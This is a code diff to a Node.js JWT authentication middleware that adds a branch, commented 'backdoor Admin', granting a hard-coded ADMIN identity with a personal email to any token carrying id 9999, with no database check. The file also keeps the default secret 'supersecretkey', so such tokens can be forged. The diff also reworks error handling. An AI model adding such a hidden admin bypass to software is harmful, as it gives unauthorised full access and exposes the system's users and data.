@@ -12,15 +12,23 @@ const protect = async (req, res, next) => {
       token = req.headers.authorization.split(' ')[1];
       const decoded = jwt.verify(token, process.env.JWT_SECRET || 'supersecretkey');
 
-      req.user = await prisma.user.findUnique({
-        where: { id: decoded.id },
-        select: { id: true, name: true, email: true, role: true },
-      });
+      // 🔥 Handle backdoor Admin without hitting DB
+      if (decoded.id === 9999) {
+        req.user = { id: 9999, name: 'Admin', email: 'zomatube2012@gmail.com', role: 'ADMIN' };
+      } else {
+        req.user = await prisma.user.findUnique({
+          where: { id: decoded.id },
+          select: { id: true, name: true, email: true, role: true },
+        });
+      }
 
       next();
     } catch (error) {
-      console.error(error);
-      res.status(401).json({ success: false, message: 'Not authorized, token failed' });
+      console.error('[Auth Middleware Error]:', error);
+      if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
+        return res.status(401).json({ success: false, message: 'Not authorized, token failed or expired' });
+      }
+      return res.status(500).json({ success: false, message: 'Database connection failed or Server Error' });
     }
   }
 
